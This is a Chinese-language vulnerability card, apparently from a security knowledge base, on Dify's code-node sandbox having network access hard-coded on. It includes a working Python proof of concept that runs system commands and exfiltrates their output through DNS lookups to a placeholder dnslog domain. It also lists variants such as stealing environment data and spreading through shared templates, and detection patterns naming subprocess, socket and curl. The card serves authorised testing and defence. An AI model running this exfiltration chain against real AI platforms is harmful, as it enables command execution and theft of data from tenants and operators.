---
id: ai-security-agent-security-dify-code-sandbox-network-egress
title: Dify 代码节点沙箱默认允许网络：工作流作者可执行命令并经 DNS 外带
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: dify-code-sandbox-network-egress
aliases:
- Dify 代码沙箱
- Dify 代码节点 RCE
- 代码沙箱网络访问
- DNS 外带 whoami
- enable_network True
- 工作流代码节点
tags:
- dify
- ai-platform
- code-sandbox
- workflow
- network-egress
- dns-exfiltration
- subprocess
- sandbox
- authenticated
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Dify <= 1.16.1
verification:
  verified_by: verifier-V106
  verified_at: '2026-11-05T22:41:53+08:00'
  notes: 已对照原文与图03/04/05核对：代码执行请求 enable_network 硬编码 True、Python 节点 subprocess 执行 whoami/hostname、socket.gethostbyname 拼 DNSLog 子域名，图05 记录 whoami/host/combo 解析，与卡片一致。卡片按“需登录且有工作流编辑权限”定级 medium，合理；原文未做沙箱逃逸或内网读取。版本按原文影响版本标记设为 Dify <= 1.16.1；PoC 未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

Dify 的代码执行节点在向沙箱服务提交代码时硬编码 `enable_network: True`；拥有工作流编辑权限的用户可以在 Python 节点里调用 `subprocess` 执行 `whoami`、`hostname` 等命令，并通过 `socket.gethostbyname()` 把结果拼进 DNS 子域名外带，说明代码沙箱并非无网络隔离环境。

## 原理

- Dify 的工作流“代码节点”把用户代码、preload 脚本和语言类型提交给独立代码执行服务（`/v1/sandbox/run`），请求体中 `enable_network` 被硬编码为 `True`，沙箱容器因此具备出站网络能力。
- 代码节点按设计执行用户提供的 Python，因此可以直接 `import subprocess` 调用系统命令；沙箱隔离的是宿主机文件系统/进程，不是“禁止一切命令”。
- 一旦同时具备命令执行与出站网络，攻击者（或恶意工作流作者）可以把命令输出编码进 DNS 查询：`<data>.<dnslog-domain>`，由 `socket.gethostbyname()` 触发解析；DNS 请求通常不受 HTTP 出站白名单限制，且日志可被攻击者查看。
- 这条链不要求逃逸沙箱：危害在于沙箱内的代码可以读取自身环境信息、访问内网/云元数据（若网络策略允许）并把数据外带；代码节点运行在 AI 平台后端，可能带有平台内部网络位置。
- 根因是“代码执行”与“网络访问”两个能力被默认同时打开，且没有按工作流/租户做网络策略或人工审批。

## 触发条件

- 目标为 Dify <= 1.16.1（原文影响版本标记）。
- 攻击者拥有创建/编辑工作流的权限，能在流程中加入代码节点并选择 Python。
- 代码执行服务可达且 `enable_network` 为 True（默认配置）。
- 沙箱允许 `subprocess`/`socket` 等标准库调用，且 DNS 出站未被阻断。
- 若目标还允许代码节点访问内网/云元数据，危害可从信息外带扩展到内网探测。

## 利用步骤

1. 登录 Dify（或使用被授权的低权限账号），创建一个工作流，添加“代码”节点，语言选择 Python。
2. 在节点中写入代码：用 `subprocess.check_output` 执行 `whoami`、`hostname`、`pwd` 等无害命令，读取输出。
3. 把输出清洗后拼成子域名，调用 `socket.gethostbyname(f"{data}.<your>.dnslog.cn")` 触发 DNS 查询。
4. 运行/预览工作流，在 DNSLog 平台查看解析记录，确认命令输出已外带。
5. 授权测试中只使用无害命令和自有 DNSLog；验证内网可达性时先使用端口/主机探测，不读取真实凭据。
6. 评估是否可进一步访问云元数据、内部 HTTP 服务或其他租户数据；报告时明确当前权限与网络策略。

## PoC

```python
import socket
import subprocess

whoami = subprocess.check_output("whoami", shell=True, text=True).strip()
hostname = subprocess.check_output("hostname", shell=True, text=True).strip()

# 清洗后拼进 DNS 子域名；实际测试替换为自己的 dnslog 域名
data = f"whoami-{whoami}-host-{hostname}".replace(" ", "-")[:50]
socket.gethostbyname(f"{data}.<your>.dnslog.cn")
```

DNSLog 侧应出现类似记录：

```text
whoami-<user>.hv6wgj.dnslog.cn
host-<hostname>-<timestamp>.hv6wgj.dnslog.cn
combo-<user>-at-<hostname>-<timestamp>.hv6wgj.dnslog.cn
```

## 变体与关联

- 变体：外带通道换成 HTTP/DNS/ICMP；数据编码为 hex/base64/分片，突破 DNS 标签 63 字符限制。
- 变体：代码节点读取环境变量、配置文件、其他工作流数据或平台内部接口，再外带；若沙箱可访问内网，可做端口扫描与内网 SSRF。
- 变体：把代码节点嵌入共享模板/公开应用，诱导其他用户运行，扩大影响面。
- 关联卡片：[[web-generic-ssrf-dify-remote-files-upload-unauth]]（同一 Dify 版本的未授权 SSRF）、[[ai-security-agent-security-langchain-python-ast-repl-exec-injection]]（Agent 代码执行工具的风险）、[[cloud-container-docker-socket-tcp-escape]]（沙箱内逃逸的后续路径）。
- 关联：AI 工作流平台的“代码节点/自定义函数”普遍存在类似边界，需按平台权限模型评估。

## 检测与防御

- 防御：代码沙箱默认 `enable_network: False`，按工作流/租户显式申请网络白名单；不要硬编码全局 True。
- 防御：出站只允许必要域名/IP，阻断 DNS 任意解析或使用受控解析器；对 DNS 查询长度/熵/子域名模式做异常检测。
- 防御：代码节点限制可用模块（禁用 `subprocess`、`socket` 或仅允许纯计算库），或使用更强隔离（gVisor/Firecracker/无网络命名空间）。
- 防御：对创建/修改代码节点、启用网络、发布工作流做权限分级与审计；共享模板需审核。
- 检测：代码执行服务日志中出现 `enable_network: true` 且代码含 `socket.gethostbyname`、`subprocess`、`os.system`、`curl` 等；沙箱容器出现异常 DNS 查询/外连；DNS 子域名包含 `whoami`、`host`、`combo` 等模式。
- 响应：禁用问题工作流，隔离沙箱节点，排查外带数据与内网访问记录，轮换沙箱内可能暴露的凭据，升级/调整网络策略。
